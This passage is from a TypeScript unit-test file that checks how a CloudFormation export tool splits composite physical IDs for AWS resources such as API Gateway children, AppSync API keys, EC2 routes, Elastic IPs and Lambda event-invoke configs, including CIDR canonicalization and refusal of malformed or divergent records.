    expect(
      splitCompositePhysicalId('AWS::ApiGateway::RequestValidator', 'api-xyz|rv123', {})
    ).toEqual({
      resourceIdentifier: { RestApiId: 'api-xyz', RequestValidatorId: 'rv123' },
      propertiesOverlay: { RestApiId: 'api-xyz' },
    });
  });

  it('throws when a REST API child has more than two id parts', () => {
    expect(() =>
      splitCompositePhysicalId('AWS::ApiGateway::Stage', 'a|b|c', { RestApiId: 'api-xyz' })
    ).toThrow(/expected a bare StageName/);
  });

  it('throws when a REST API child id is blank', () => {
    expect(() =>
      splitCompositePhysicalId('AWS::ApiGateway::Authorizer', '   ', { RestApiId: 'api-xyz' })
    ).toThrow(/empty physical id/);
  });

  it('throws when a bare REST API child id has no RestApiId in state properties', () => {
    expect(() => splitCompositePhysicalId('AWS::ApiGateway::Deployment', 'dep123', {})).toThrow(
      /missing 'RestApiId'/
    );
  });

  it('parses AWS::ApiGatewayV2::Integration with ApiId from properties (narrow overlay)', () => {
    // cdkd stores only the secondary id (IntegrationId) in physicalId; ApiId
    // comes from state.properties. Overlay excludes IntegrationId (not a
    // Property of the type — AWS-generated).
    expect(
      splitCompositePhysicalId('AWS::ApiGatewayV2::Integration', 'integ-abc123', {
        ApiId: 'api-xyz',
      })
    ).toEqual({
      resourceIdentifier: { ApiId: 'api-xyz', IntegrationId: 'integ-abc123' },
      propertiesOverlay: { ApiId: 'api-xyz' },
    });
  });

  it('parses AWS::ApiGatewayV2::Route with ApiId from properties (narrow overlay)', () => {
    expect(
      splitCompositePhysicalId('AWS::ApiGatewayV2::Route', 'route-def456', {
        ApiId: 'api-xyz',
      })
    ).toEqual({
      resourceIdentifier: { ApiId: 'api-xyz', RouteId: 'route-def456' },
      propertiesOverlay: { ApiId: 'api-xyz' },
    });
  });

  describe('AWS::ApiGatewayV2::Stage (issue #1772)', () => {
    it('reads ApiId from properties for the bare StageName the SDK provider stores', () => {
      // No `propertiesOverlay`: neither field is `readOnlyProperties`, so the
      // overlay site writes the whole identifier map.
      expect(
        splitCompositePhysicalId('AWS::ApiGatewayV2::Stage', '$default', { ApiId: 'api-xyz' })
      ).toEqual({ resourceIdentifier: { ApiId: 'api-xyz', StageName: '$default' } });
    });

    it("splits Cloud Control's `<apiId>|<stageName>` without reading properties", () => {
      // The properties' ApiId differs on purpose: the composite id is the source.
      expect(
        splitCompositePhysicalId('AWS::ApiGatewayV2::Stage', 'api-cc|prod', { ApiId: 'other' })
      ).toEqual({ resourceIdentifier: { ApiId: 'api-cc', StageName: 'prod' } });
    });

    it('refuses a bare StageName whose recorded ApiId is missing or not a string', () => {
      expect(() => splitCompositePhysicalId('AWS::ApiGatewayV2::Stage', '$default', {})).toThrow(
        /missing 'ApiId'/
      );
      expect(() =>
        splitCompositePhysicalId('AWS::ApiGatewayV2::Stage', '$default', {
          ApiId: { Ref: 'Api' },
        })
      ).toThrow(/missing 'ApiId'/);
    });

    it('refuses a blank id, an empty segment, and a third segment', () => {
      const props = { ApiId: 'api-xyz' };
      expect(() => splitCompositePhysicalId('AWS::ApiGatewayV2::Stage', '  ', props)).toThrow(
        /empty physical id/
      );
      expect(() => splitCompositePhysicalId('AWS::ApiGatewayV2::Stage', '|prod', props)).toThrow(
        /empty part/
      );
      expect(() => splitCompositePhysicalId('AWS::ApiGatewayV2::Stage', 'api|', props)).toThrow(
        /empty part/
      );
      expect(() => splitCompositePhysicalId('AWS::ApiGatewayV2::Stage', 'a|b|c', props)).toThrow(
        /got 3 parts/
      );
    });
  });

  it('parses AWS::Lambda::Permission with FunctionName from properties (narrow overlay)', () => {
    // CFn schema calls the secondary key `Id` (NOT StatementId). cdkd's
    // physicalId IS the StatementId, which becomes `Id` in CFn's
    // ResourceIdentifier. `Id` is NOT a Property of AWS::Lambda::Permission,
    // so overlay narrows to FunctionName.
    expect(
      splitCompositePhysicalId('AWS::Lambda::Permission', 'MyStatement123', {
        FunctionName: 'my-stack-fn',
      })
    ).toEqual({
      resourceIdentifier: { FunctionName: 'my-stack-fn', Id: 'MyStatement123' },
      propertiesOverlay: { FunctionName: 'my-stack-fn' },
    });
  });

  it('normalizes legacy `<functionArn>|<statementId>` physicalId for AWS::Lambda::Permission', () => {
    // State entries written by the older CC-API path (pre-SDK-provider)
    // store physicalId as `<functionArn>|<statementId>`. The splitter
    // must surface the bare statementId as `Id` so CFn IMPORT's
    // identifier-match compares the correct value against the AWS-current
    // Sid. Mirrors lambda-permission-provider.ts's own normalization.
    expect(
      splitCompositePhysicalId(
        'AWS::Lambda::Permission',
        'arn:aws:lambda:us-east-1:123456789012:function:my-fn|MyStatement123',
        { FunctionName: 'my-stack-fn' }
      )
    ).toEqual({
      resourceIdentifier: { FunctionName: 'my-stack-fn', Id: 'MyStatement123' },
      propertiesOverlay: { FunctionName: 'my-stack-fn' },
    });
  });

  // Issue #3414 — AWS::AppSync::ApiKey. All three id shapes the splitter
  // accepts, each narrowing the overlay to `ApiId` (`ApiKeyId` is readOnly).
  it('parses AWS::AppSync::ApiKey `apiId|apiKeyId` (what the SDK provider packs)', () => {
    expect(splitCompositePhysicalId('AWS::AppSync::ApiKey', 'abc123|da2-key456')).toEqual({
      resourceIdentifier: { ApiId: 'abc123', ApiKeyId: 'da2-key456' },
      propertiesOverlay: { ApiId: 'abc123' },
    });
  });

  it('parses the AWS::AppSync::ApiKey ARN (CloudFormation `Ref`, the migrate-from-cfn PhysicalResourceId)', () => {
    expect(
      splitCompositePhysicalId(
        'AWS::AppSync::ApiKey',
        'arn:aws:appsync:us-east-1:123456789012:apis/abc123/apikey/da2-key456'
      )
    ).toEqual({
      resourceIdentifier: { ApiId: 'abc123', ApiKeyId: 'da2-key456' },
      propertiesOverlay: { ApiId: 'abc123' },
    });
  });

  it('parses a bare AWS::AppSync::ApiKey id (pre-flip Cloud Control record), taking ApiId from state', () => {
    expect(
      splitCompositePhysicalId('AWS::AppSync::ApiKey', 'da2-key456', { ApiId: 'abc123' })
    ).toEqual({
      resourceIdentifier: { ApiId: 'abc123', ApiKeyId: 'da2-key456' },
      propertiesOverlay: { ApiId: 'abc123' },
    });
  });

  it('never writes the read-only ApiKeyId into Properties for any AWS::AppSync::ApiKey shape', () => {
    for (const id of [
      'abc123|da2-key456',
      'arn:aws:appsync:us-east-1:123456789012:apis/abc123/apikey/da2-key456',
      'da2-key456',
    ]) {
      const result = splitCompositePhysicalId('AWS::AppSync::ApiKey', id, { ApiId: 'abc123' });
      expect(result.propertiesOverlay).toBeDefined();
      expect(result.propertiesOverlay).not.toHaveProperty('ApiKeyId');
    }
  });

  it('refuses a malformed AWS::AppSync::ApiKey id rather than guessing', () => {
    expect(() => splitCompositePhysicalId('AWS::AppSync::ApiKey', 'a|b|c')).toThrow(
      /got 3 parts/
    );
    expect(() => splitCompositePhysicalId('AWS::AppSync::ApiKey', 'abc123|')).toThrow(
      /empty part/
    );
    expect(() => splitCompositePhysicalId('AWS::AppSync::ApiKey', '   ')).toThrow(
      /empty physical id/
    );
    // The bare form needs the parent from state: a corrupt record is reported,
    // not turned into a half-identifier.
    expect(() => splitCompositePhysicalId('AWS::AppSync::ApiKey', 'da2-key456', {})).toThrow(
      /missing 'ApiId'/
    );
  });

  it('refuses an ARN that is not the AppSync key ARN instead of shipping it as a bare key id', () => {
    // Review of #3414: a mis-spelled ARN (plural `apikeys`, another service)
    // has no `|`, so without the guard it fell through to the bare arm and
    // went out verbatim as `ApiKeyId` — a wrong identifier only CreateChangeSet
    // would have noticed.
    for (const arn of [
      'arn:aws:appsync:us-east-1:123456789012:apis/abc123/apikeys/da2-key456',
      'arn:aws:lambda:us-east-1:123456789012:function:not-a-key',
    ]) {
      expect(() =>
        splitCompositePhysicalId('AWS::AppSync::ApiKey', arn, { ApiId: 'abc123' })
      ).toThrow(/looks like an ARN but is not an AppSync API key ARN/);
    }
  });

  it('throws on wrong part count for ApiGateway::Method', () => {
    expect(() => splitCompositePhysicalId('AWS::ApiGateway::Method', 'only-two|parts')).toThrow(
      /expected 3 parts/
    );
  });

  it('throws on too many parts for ApiGateway::Resource', () => {
    // A single part is now VALID (the bare SDK-created id), so the negative
    // case is an over-long id, not a short one.
    expect(() =>
      splitCompositePhysicalId('AWS::ApiGateway::Resource', 'api|res|extra', {
        RestApiId: 'api123',
      })
    ).toThrow(/got 3 parts/);
  });

  it('throws on an empty part in the ApiGateway::Resource composite', () => {
    expect(() =>
      splitCompositePhysicalId('AWS::ApiGateway::Resource', 'api123|', { RestApiId: 'api123' })
    ).toThrow(/empty part/);
  });

  it('throws on a wholly empty ApiGateway::Resource physical id', () => {
    // Without the guard the bare branch would ship `ResourceId: ''` to CFn.
    expect(() =>
      splitCompositePhysicalId('AWS::ApiGateway::Resource', '', { RestApiId: 'api123' })
    ).toThrow(/empty physical id/);
  });

  it('throws on a BLANK ApiGateway::Resource physical id', () => {
    // Truthiness alone lets ' ' through as `ResourceId: ' '`.
    expect(() =>
      splitCompositePhysicalId('AWS::ApiGateway::Resource', '   ', { RestApiId: 'api123' })
    ).toThrow(/empty physical id/);
  });

  it('throws on wrong part count for VPCGatewayAttachment', () => {
    expect(() =>
      splitCompositePhysicalId('AWS::EC2::VPCGatewayAttachment', 'three|parts|here')
    ).toThrow(/expected 2 parts/);
  });

  it('throws when ApiGwV2 Integration properties lack ApiId (state corruption)', () => {
    expect(() =>
      splitCompositePhysicalId('AWS::ApiGatewayV2::Integration', 'integ-abc', {})
    ).toThrow(/missing 'ApiId'/);
  });

  it('throws when ApiGwV2 Route properties lack ApiId (state corruption)', () => {
    expect(() =>
      splitCompositePhysicalId('AWS::ApiGatewayV2::Route', 'route-abc', {})
    ).toThrow(/missing 'ApiId'/);
  });

  it('throws when Lambda::Permission properties lack FunctionName (state corruption)', () => {
    expect(() =>
      splitCompositePhysicalId('AWS::Lambda::Permission', 'sid', {})
    ).toThrow(/missing 'FunctionName'/);
  });

  it('throws on unregistered type', () => {
    expect(() => splitCompositePhysicalId('AWS::Made::Up::Type', 'whatever')).toThrow(
      /no composite-id splitter registered/
    );
  });

  it.each(['constructor', 'toString', 'valueOf', '__proto__'])(
    'reports %s as unregistered rather than calling an inherited member',
    (resourceType) => {
      // A bare index into the splitter map answers for Object.prototype members,
      // so `constructor` would make `splitter` the Object constructor — truthy,
      // callable, and silently returning a String object instead of taking the
      // not-registered branch. Same hazard as the AttachmentType alias lookup.
      expect(() => splitCompositePhysicalId(resourceType, 'whatever')).toThrow(
        /no composite-id splitter registered/
      );
      expect(hasCompositeIdSplitter(resourceType)).toBe(false);
    }
  );
});

/**
 * Issue [#1771](https://github.com/go-to-k/cdkd/issues/1771) — three types cdkd
 * deploys routinely had no `COMPOSITE_ID_SPLITTERS` entry, and `cdkd export` is
 * all-or-nothing, so ONE of them aborted the whole command with
 * "resource type uses a composite primary identifier ... add an entry to
 * COMPOSITE_ID_SPLITTERS". `AWS::EC2::Route` is the widest blast radius:
 * essentially every VPC stack with a public subnet declares one.
 *
 * Every schema fact asserted below is a LIVE `aws cloudformation describe-type`
 * measurement, us-east-1, 2026-08-13:
 *
 * | type | primaryIdentifier | readOnlyProperties |
 * |---|---|---|
 * | `AWS::EC2::Route` | RouteTableId, CidrBlock | CidrBlock |
 * | `AWS::EC2::EIP` | PublicIp, AllocationId | PublicIp, AllocationId |
 * | `AWS::Lambda::EventInvokeConfig` | FunctionName, Qualifier | (none) |
 *
 * The read-only column is what each `propertiesOverlay` below encodes: a
 * read-only field written into the synth template's `Properties` is rejected by
 * CFn at changeset-create, so `EIP` narrows to NOTHING and `Route` to
 * `RouteTableId`, while `EventInvokeConfig` keeps the default whole-map overlay.
 */
describe('splitCompositePhysicalId — issue #1771 types', () => {
  /**
   * The live `primaryIdentifier` field sets. `resolveResourceIdentifier` cross-
   * checks the splitter's output against exactly this list (it throws when a
   * declared field is missing), so pinning the WHOLE key set here — not just the
   * fields each individual case happens to look at — is what fences a splitter
   * that produces a plausible-but-incomplete map.
   */
  const PRIMARY_IDENTIFIER_FIELDS: Record<string, string[]> = {
    'AWS::EC2::Route': ['RouteTableId', 'CidrBlock'],
    'AWS::EC2::EIP': ['PublicIp', 'AllocationId'],
    'AWS::Lambda::EventInvokeConfig': ['FunctionName', 'Qualifier'],
  };

  it('registers all three types', () => {
    for (const type of Object.keys(PRIMARY_IDENTIFIER_FIELDS)) {
      expect(hasCompositeIdSplitter(type)).toBe(true);
    }
  });

  it('produces exactly the live primaryIdentifier fields for each type', () => {
    const samples: Record<string, [string, Record<string, unknown>]> = {
      'AWS::EC2::Route': ['rtb-abc123|0.0.0.0/0', { DestinationCidrBlock: '0.0.0.0/0' }],
      'AWS::EC2::EIP': ['52.1.2.3|eipalloc-0abc123def456789a', {}],
      'AWS::Lambda::EventInvokeConfig': ['my-fn|$LATEST', {}],
    };
    for (const [type, fields] of Object.entries(PRIMARY_IDENTIFIER_FIELDS)) {
      const [physicalId, properties] = samples[type]!;
      const result = splitCompositePhysicalId(type, physicalId, properties);
      expect(Object.keys(result.resourceIdentifier).sort()).toEqual([...fields].sort());
    }
  });

  // ── AWS::EC2::Route ───────────────────────────────────────────────
  //
  // CFn's `CidrBlock` holds whichever destination the route declares — NOT
  // specifically an IPv4 CIDR. Measured live via Cloud Control `GetResource`
  // against a scratch route table (us-east-1, 2026-08-13): identifier
  // `rtb-…|::/0` reads back `{"CidrBlock":"::/0","DestinationIpv6CidrBlock":"::/0",…}`.
  it.each([
    ['DestinationCidrBlock', '0.0.0.0/0'],
    ['DestinationIpv6CidrBlock', '::/0'],
    ['DestinationPrefixListId', 'pl-63a5400a'],
  ])('maps the %s destination onto CFn CidrBlock verbatim', (key, destination) => {
    expect(
      splitCompositePhysicalId('AWS::EC2::Route', `rtb-abc123|${destination}`, {
        RouteTableId: { Ref: 'RouteTable' },
        [key]: destination,
        GatewayId: { Ref: 'Igw' },
      })
    ).toEqual({
      resourceIdentifier: { RouteTableId: 'rtb-abc123', CidrBlock: destination },
      propertiesOverlay: { RouteTableId: 'rtb-abc123' },
    });
  });

  it('never overlays the read-only CidrBlock into Properties', () => {
    // propertiesOverlay defaults to the whole resourceIdentifier map, so an
    // absent overlay would hand CFn a read-only property at changeset-create.
    const result = splitCompositePhysicalId('AWS::EC2::Route', 'rtb-abc123|10.0.0.0/16', {
      DestinationCidrBlock: '10.0.0.0/16',
    });
    expect(result.propertiesOverlay).toBeDefined();
    expect(result.propertiesOverlay).not.toHaveProperty('CidrBlock');
  });

  it('accepts a Route state entry whose properties record no destination at all', () => {
    // A partial / hand-edited state record must not become a refusal — the
    // physical id alone carries everything the identifier needs.
    expect(splitCompositePhysicalId('AWS::EC2::Route', 'rtb-abc123|0.0.0.0/0', {})).toEqual({
      resourceIdentifier: { RouteTableId: 'rtb-abc123', CidrBlock: '0.0.0.0/0' },
      propertiesOverlay: { RouteTableId: 'rtb-abc123' },
    });
  });

  it('does NOT warn when the recorded destination agrees with the physical id', () => {
    const warn = vi.spyOn(getLogger(), 'warn').mockImplementation(() => {});
    try {
      splitCompositePhysicalId('AWS::EC2::Route', 'rtb-abc123|::/0', {
        DestinationIpv6CidrBlock: '::/0',
      });
      // A route that declares MULTIPLE destinations is narrowed by the provider
      // to the first in CFn precedence order, so the losing key must not be read
      // as a divergence either.
      splitCompositePhysicalId('AWS::EC2::Route', 'rtb-abc123|0.0.0.0/0', {
        DestinationCidrBlock: '0.0.0.0/0',
        DestinationIpv6CidrBlock: '::/0',
      });
      expect(warn).not.toHaveBeenCalled();
    } finally {
      warn.mockRestore();
    }
  });

  it('throws on a Route physical id that is not two parts', () => {
    expect(() => splitCompositePhysicalId('AWS::EC2::Route', 'rtb-abc123', {})).toThrow(
      /expected 2 parts/
    );
    expect(() =>
      splitCompositePhysicalId('AWS::EC2::Route', 'rtb-abc123|0.0.0.0/0|extra', {})
    ).toThrow(/expected 2 parts/);
  });

  it('throws on an empty Route segment rather than shipping a blank identifier', () => {
    expect(() => splitCompositePhysicalId('AWS::EC2::Route', 'rtb-abc123|', {})).toThrow(
      /empty part/
    );
    expect(() => splitCompositePhysicalId('AWS::EC2::Route', '|0.0.0.0/0', {})).toThrow(
      /empty part/
    );
  });

  // ── AWS::EC2::EIP ─────────────────────────────────────────────────
  it('parses AWS::EC2::EIP and overlays NOTHING (both fields read-only)', () => {
    expect(
      splitCompositePhysicalId('AWS::EC2::EIP', '52.1.2.3|eipalloc-0abc123def456789a', {
        Domain: 'vpc',
      })
    ).toEqual({
      resourceIdentifier: { PublicIp: '52.1.2.3', AllocationId: 'eipalloc-0abc123def456789a' },
      propertiesOverlay: {},
    });
  });

  it('gives EIP an EXPLICIT empty overlay, not an absent one', () => {
    // An absent overlay falls back to the full resourceIdentifier map at the
    // overlay site, which would write two read-only properties.
    const result = splitCompositePhysicalId(
      'AWS::EC2::EIP',
      '52.1.2.3|eipalloc-0abc123def456789a',
      {}
    );
    expect(result.propertiesOverlay).toBeDefined();
    expect(result.propertiesOverlay).toEqual({});
  });

  it('binds the EIP segments by SHAPE, so a reversed record still resolves', () => {
    // Every writer goes through `eipPhysicalId` (publicIp first), but that
    // ordering is the one thing here nobody has verified against a record in
    // the wild — and a POSITIONAL bind turns a reversed record into
    // `{PublicIp: 'eipalloc-…', AllocationId: '52.1.2.3'}`, which CFn answers
    // with an opaque changeset-create failure. The two shapes are disjoint.
    expect(
      splitCompositePhysicalId('AWS::EC2::EIP', 'eipalloc-0abc123def456789a|52.1.2.3', {})
    ).toEqual({
      resourceIdentifier: { PublicIp: '52.1.2.3', AllocationId: 'eipalloc-0abc123def456789a' },
      propertiesOverlay: {},
    });
  });

  it('refuses an EIP composite in which neither segment is an allocation id', () => {
    expect(() => splitCompositePhysicalId('AWS::EC2::EIP', '52.1.2.3|52.1.2.4', {})).toThrow(
      /must be an allocation id/s
    );
  });

  it('refuses an EIP composite of TWO allocation ids', () => {
    // The half the shape bind originally forgot: this satisfies an
    // allocation-id-only guard and then ships `PublicIp: 'eipalloc-b'` — the
    // opaque changeset-create failure the discriminator exists to prevent. A
    // discriminator that validates one side only is not a discriminator.
    expect(() =>
      splitCompositePhysicalId('AWS::EC2::EIP', 'eipalloc-0aaa|eipalloc-0bbb', {})
    ).toThrow(/dotted-quad public IP/s);
  });

  it('refuses an EIP public-IP segment that is not a dotted quad', () => {
    expect(() =>
      splitCompositePhysicalId('AWS::EC2::EIP', 'not-an-ip|eipalloc-0aaa', {})
    ).toThrow(/dotted-quad public IP/s);
  });

  it('throws on whitespace-only EIP segments', () => {
    expect(() => splitCompositePhysicalId('AWS::EC2::EIP', '  |  ', {})).toThrow(/empty part/);
  });

  it.each(['eipalloc-0abc123def456789a', '52.1.2.3'])(
    'refuses the bare EIP form %s (neither field recovers the other)',
    (bare) => {
      expect(() => splitCompositePhysicalId('AWS::EC2::EIP', bare, {})).toThrow(
        /expected 2 parts.*re-deploy the resource/s
      );
    }
  );

  it('throws on an empty EIP segment', () => {
    expect(() => splitCompositePhysicalId('AWS::EC2::EIP', '|eipalloc-0abc', {})).toThrow(
      /empty part/
    );
    expect(() => splitCompositePhysicalId('AWS::EC2::EIP', '52.1.2.3|', {})).toThrow(/empty part/);
  });

  // ── AWS::Lambda::EventInvokeConfig ────────────────────────────────
  it('parses AWS::Lambda::EventInvokeConfig with the default whole-map overlay', () => {
    // The type declares NO readOnlyProperties, and both fields are `required`
    // Properties the synth template already carries — writing them is what
    // keeps CFn's identifier-match check satisfied.
    expect(
      splitCompositePhysicalId('AWS::Lambda::EventInvokeConfig', 'my-fn|live', {})
    ).toEqual({
      resourceIdentifier: { FunctionName: 'my-fn', Qualifier: 'live' },
    });
  });

  it('reads a BARE function name as qualifier $LATEST', () => {
    expect(splitCompositePhysicalId('AWS::Lambda::EventInvokeConfig', 'my-fn', {})).toEqual({
      resourceIdentifier: { FunctionName: 'my-fn', Qualifier: '$LATEST' },
    });
  });

  it('splits an EventInvokeConfig id on the FIRST separator', () => {
    // A function ARN carries colons but never a `|`, and a qualifier is a
    // version number or an alias name — the premise the provider's own
    // parsePhysicalId documents and packCompositeId enforces.
    expect(
      splitCompositePhysicalId(
        'AWS::Lambda::EventInvokeConfig',
        'arn:aws:lambda:us-east-1:123456789012:function:my-fn|2',
        {}
      )
    ).toEqual({
      resourceIdentifier: {
        FunctionName: 'arn:aws:lambda:us-east-1:123456789012:function:my-fn',
        Qualifier: '2',
      },
    });
  });

  it('throws on a blank or half-empty EventInvokeConfig physical id', () => {
    expect(() => splitCompositePhysicalId('AWS::Lambda::EventInvokeConfig', '   ', {})).toThrow(
      /empty physical id/
    );
    expect(() => splitCompositePhysicalId('AWS::Lambda::EventInvokeConfig', 'my-fn|', {})).toThrow(
      /empty part/
    );
    expect(() => splitCompositePhysicalId('AWS::Lambda::EventInvokeConfig', '|$LATEST', {})).toThrow(
      /empty part/
    );
    // `'  |  '` clears the whole-id blank guard (it is not blank once split),
    // so the per-segment check has to trim too or a whitespace FunctionName
    // ships into the changeset.
    expect(() => splitCompositePhysicalId('AWS::Lambda::EventInvokeConfig', '  |  ', {})).toThrow(
      /empty part/
    );
  });

  // ── the empty overlay has to SURVIVE both overlay call sites ───────
  it('keeps an EXPLICIT empty overlay through both template overlay sites', () => {
    // `propertiesOverlay: {}` only protects the EIP if the overlay sites treat
    // it as "write nothing" rather than falling back to the full identifier
    // map. Both spell that fallback `entry.propertiesOverlay ?? entry.resourceIdentifier`,
    // which is correct for `{}` and would be WRONG for `|| `.
    const entry = {
      logicalId: 'Eip',
      resourceType: 'AWS::EC2::EIP',
      physicalId: '52.1.2.3|eipalloc-0abc',
      ...splitCompositePhysicalId('AWS::EC2::EIP', '52.1.2.3|eipalloc-0abc', {}),
    };
    // A template that DOES carry both fields as literal strings — the only
    // shape the overlay would rewrite.
    const template = {
      Resources: {
        Eip: {
          Type: 'AWS::EC2::EIP',
          Properties: { Domain: 'vpc', PublicIp: 'stale', AllocationId: 'stale' },
        },
      },
    };
    const phase1 = filterTemplateForImport(structuredClone(template), [entry]);
    const phase1Props = (
      (phase1['Resources'] as Record<string, Record<string, unknown>>)['Eip'] as Record<
        string,
        unknown
      >
    )['Properties'];
    expect(phase1Props).toEqual({ Domain: 'vpc', PublicIp: 'stale', AllocationId: 'stale' });

    const phase2 = applyImportOverlayForPhase2(structuredClone(template), [entry]);
    const phase2Props = (
      (phase2['Resources'] as Record<string, Record<string, unknown>>)['Eip'] as Record<
        string,
        unknown
      >
    )['Properties'];
    // Phase 1 and phase 2 must agree, or CFn sees a property change between
    // the IMPORT'd state and the UPDATE template and silently REPLACES.
    expect(phase2Props).toEqual(phase1Props);
  });

  // ── the Route id-vs-properties divergence policy ───────────────────
  it('passes through an AWS host-bit canonicalization without warning', () => {
    // CFn documents rewriting `100.68.0.18/18` to `100.68.0.0/18`, so the id
    // legitimately differs from what the template declares. Refusing here
    // would block an export whose identifier is CORRECT.
    const warn = vi.spyOn(getLogger(), 'warn').mockImplementation(() => {});
    try {
      expect(
        splitCompositePhysicalId('AWS::EC2::Route', 'rtb-abc123|100.68.0.0/18', {
          DestinationCidrBlock: '100.68.0.18/18',
        }).resourceIdentifier
      ).toEqual({ RouteTableId: 'rtb-abc123', CidrBlock: '100.68.0.0/18' });
      expect(warn).not.toHaveBeenCalled();
    } finally {
      warn.mockRestore();
    }
  });

  it('canonicalizes a Route identifier the SDK path stored with host bits set', () => {
    // The defect this fences: `createRoute` packs the destination it SENT, and
    // EC2 clears host bits on the way in, so state can hold
    // `rtb-…|100.68.0.18/18` while AWS/CFn hold `100.68.0.0/18`. The recorded
    // properties hold the SAME non-canonical value, so the agreement check
    // passes and a verbatim return would ship an identifier CloudFormation
    // cannot resolve — the exact opaque rejection this path exists to prevent.
    const warn = vi.spyOn(getLogger(), 'warn').mockImplementation(() => {});
    try {
      expect(
        splitCompositePhysicalId('AWS::EC2::Route', 'rtb-abc123|100.68.0.18/18', {
          DestinationCidrBlock: '100.68.0.18/18',
        })
      ).toEqual({
        resourceIdentifier: { RouteTableId: 'rtb-abc123', CidrBlock: '100.68.0.0/18' },
        propertiesOverlay: { RouteTableId: 'rtb-abc123' },
      });
      expect(warn).not.toHaveBeenCalled();
    } finally {
      warn.mockRestore();
    }
  });

  it('canonicalizes even when state records no destination at all', () => {
    // The no-properties early return is a separate exit from the agreement
    // check, and it shipped the raw segment too.
    expect(
      splitCompositePhysicalId('AWS::EC2::Route', 'rtb-abc123|10.1.2.3/24', {})
        .resourceIdentifier
    ).toEqual({ RouteTableId: 'rtb-abc123', CidrBlock: '10.1.2.0/24' });
  });

  it('leaves a non-IPv4 destination untouched (no canonicalization modelled)', () => {
    for (const destination of ['::/0', 'pl-63a5400a']) {
      expect(
        splitCompositePhysicalId('AWS::EC2::Route', `rtb-abc123|${destination}`, {})
          .resourceIdentifier['CidrBlock']
      ).toBe(destination);
    }
  });

  it('REFUSES a conclusive prefix-list mismatch (measured: stored verbatim)', () => {
    // A prefix-list destination is stored VERBATIM on both sides (measured via
    // Cloud Control), so there is no unmodelled rewrite to excuse a difference:
    // `pl-AAA` vs `pl-BBB` is the wrong-route case, not a formatting one.
    expect(() =>
      splitCompositePhysicalId('AWS::EC2::Route', 'rtb-abc123|pl-63a5400a', {
        DestinationPrefixListId: 'pl-0123abcd',
      })
    ).toThrow(/would then REPLACE \(delete\) it/);
  });

  it('fences EVERY vs SOME on the decidability boundary', () => {
    // A record declaring BOTH a modelled and an unmodelled destination is the
    // only input that tells the two quantifiers apart — with `some` the modelled
    // IPv4 value would make this throw. The whole refusal policy rests on it
    // being `every`, i.e. "refuse only when nothing here could excuse the gap".
    const warn = vi.spyOn(getLogger(), 'warn').mockImplementation(() => {});
    try {
      expect(
        splitCompositePhysicalId('AWS::EC2::Route', 'rtb-abc123|::/0', {
          DestinationCidrBlock: '10.0.0.0/16',
          DestinationIpv6CidrBlock: '2001:db8::/64',
        }).resourceIdentifier
      ).toEqual({ RouteTableId: 'rtb-abc123', CidrBlock: '::/0' });
      expect(warn).toHaveBeenCalledTimes(1);
    } finally {
      warn.mockRestore();
    }
    // The mirror image: both declared values modelled (IPv4 + prefix list), so
    // the same shape of record REFUSES. Without the prefix-list class this one
    // would only warn, and `every` would be unreachable for a multi-key record
    // (DestinationCidrBlock is the only IPv4 key of the three).
    expect(() =>
      splitCompositePhysicalId('AWS::EC2::Route', 'rtb-abc123|172.16.0.0/12', {
        DestinationCidrBlock: '10.0.0.0/16',
        DestinationPrefixListId: 'pl-63a5400a',
      })
    ).toThrow(/would then REPLACE \(delete\) it/);
  });

  it('treats a malformed pl- value as unmodelled rather than comparable', () => {
    // `pl-` + non-hex is not a prefix-list id; classifying it as one would make
    // an unrelated malformed record throw instead of warn.
    const warn = vi.spyOn(getLogger(), 'warn').mockImplementation(() => {});
    try {
      splitCompositePhysicalId('AWS::EC2::Route', 'rtb-abc123|pl-63a5400a', {
        DestinationPrefixListId: 'pl-NOT-HEX',
      });
      expect(warn).toHaveBeenCalledTimes(1);
    } finally {
      warn.mockRestore();
    }
  });

  it('canonicalizes a /0 whose address is not already zero', () => {
    // Fences the `prefixLength === 0` special case: JS shifts are mod 32, so
    // `0xffffffff << 32` is `0xffffffff`, not 0 — without the ternary a
    // host-bits-set /0 would come back unchanged.
    expect(
      splitCompositePhysicalId('AWS::EC2::Route', 'rtb-abc123|10.0.0.0/0', {})
        .resourceIdentifier['CidrBlock']
    ).toBe('0.0.0.0/0');
  });

  it.each(['999.1.2.3/24', '10.0.0.0/33', '10.0.0/24', 'not-a-cidr'])(
    'treats %s as un-canonicalizable rather than mangling it',
    (destination) => {
      expect(
        splitCompositePhysicalId('AWS::EC2::Route', `rtb-abc123|${destination}`, {})
          .resourceIdentifier['CidrBlock']
      ).toBe(destination);
    }
  );

  it('throws on whitespace-only Route segments', () => {
    expect(() => splitCompositePhysicalId('AWS::EC2::Route', '  |  ', {})).toThrow(/empty part/);
  });

  it('REFUSES a Route whose IPv4 divergence canonicalization cannot explain', () => {
    // Decidable case: every declared destination is a parseable IPv4 CIDR, so
    // the benign explanation is fully modelled and its failure is conclusive.
    // Continuing would let IMPORT adopt whatever route sits at the id's
    // destination — and phase 2 would then REPLACE (delete) it.
    expect(() =>
      splitCompositePhysicalId('AWS::EC2::Route', 'rtb-abc123|192.168.9.0/24', {
        DestinationCidrBlock: '10.0.0.0/16',
      })
    ).toThrow(/would then REPLACE \(delete\) it/);
  });

  it('WARNS instead of refusing when a declared destination is an IPv6 CIDR', () => {
    // IPv6 canonicalization (zero-run compression, host-bit clearing) is the
    // one shape cdkd does NOT model, so the divergence is merely unexplained
    // rather than conclusive — refusing on an undecidable signal would block
    // exports that are fine. A prefix-list id is deliberately NOT in this list:
    // it is stored verbatim on both sides, so its mismatch IS conclusive and
    // takes the throw arm (see the dedicated case above).
    const warn = vi.spyOn(getLogger(), 'warn').mockImplementation(() => {});
    try {
      expect(
        splitCompositePhysicalId('AWS::EC2::Route', 'rtb-abc123|::/0', {
          DestinationIpv6CidrBlock: '2001:db8::/64',
        }).resourceIdentifier
      ).toEqual({ RouteTableId: 'rtb-abc123', CidrBlock: '::/0' });
      expect(warn).toHaveBeenCalledTimes(1);
      expect(warn.mock.calls[0]![0]).toMatch(/REPLACE \(delete\) it/);
    } finally {
      warn.mockRestore();
    }
  });

  it('ignores an empty-string destination when deciding whether state declares one', () => {
    // A declared-but-empty key is not a declaration; treating it as one would
    // make every such record refuse against its own (correct) physical id.
    const warn = vi.spyOn(getLogger(), 'warn').mockImplementation(() => {});
    try {
      expect(
        splitCompositePhysicalId('AWS::EC2::Route', 'rtb-abc123|0.0.0.0/0', {
          DestinationCidrBlock: '',
          DestinationIpv6CidrBlock: '',
        }).resourceIdentifier
      ).toEqual({ RouteTableId: 'rtb-abc123', CidrBlock: '0.0.0.0/0' });
